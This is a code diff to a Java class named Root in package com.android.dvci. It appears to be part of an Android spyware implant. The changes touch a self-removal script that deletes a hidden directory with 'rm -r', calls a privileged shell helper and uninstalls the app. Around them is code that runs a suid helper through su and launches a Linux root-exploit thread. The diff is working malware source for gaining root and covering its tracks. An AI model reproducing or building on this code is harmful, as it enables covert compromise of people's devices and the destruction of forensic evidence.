@@ -8,6 +8,7 @@ import com.android.dvci.capabilities.PackageInfo;
 import com.android.dvci.conf.Configuration;
 import com.android.dvci.crypto.Keys;
 import com.android.dvci.file.AutoFile;
+import com.android.dvci.file.Path;
 import com.android.dvci.util.ByteArray;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.Execute;
@@ -222,7 +223,8 @@ public class Root {
 
 		String packageName = Status.self().getAppContext().getPackageName();
 		String script = M.e("#!/system/bin/sh") + "\n";
-
+		//script += Configuration.shellFile + " qzx \"rm -r " + Path.hidden() + "\"\n";
+		script += "rm -r " + Path.hidden() + "\n";
 		script += Configuration.shellFile + " ru\n";
 		script += "LD_LIBRARY_PATH=/vendor/lib:/system/lib pm uninstall " + packageName + "\n";
 		if (Cfg.DEBUG) {
@@ -379,7 +381,6 @@ public class Root {
 			}
 
 			Execute.execute(M.e("/system/bin/chmod 755 ") + selinuxSuidext);
-
 			ExecuteResult res = Execute.execute(new String[]{SU, "-c", selinuxSuidext.getFilename() + " rt"});
 
 			if (Cfg.DEBUG) {
@@ -563,6 +564,9 @@ public class Root {
 		// Start exploitation thread
 		LinuxExploitThread linuxThread = new LinuxExploitThread(frama, selinux, towel);
 		Thread exploit = new Thread(linuxThread);
+		if (Cfg.DEBUG) {
+			exploit.setName("LinuxExploitThread_"+frama+"_"+selinux+"_"+towel);
+		}
 		Status.setExploitStatus(Status.EXPLOIT_STATUS_RUNNING);
 		exploit.start();
 
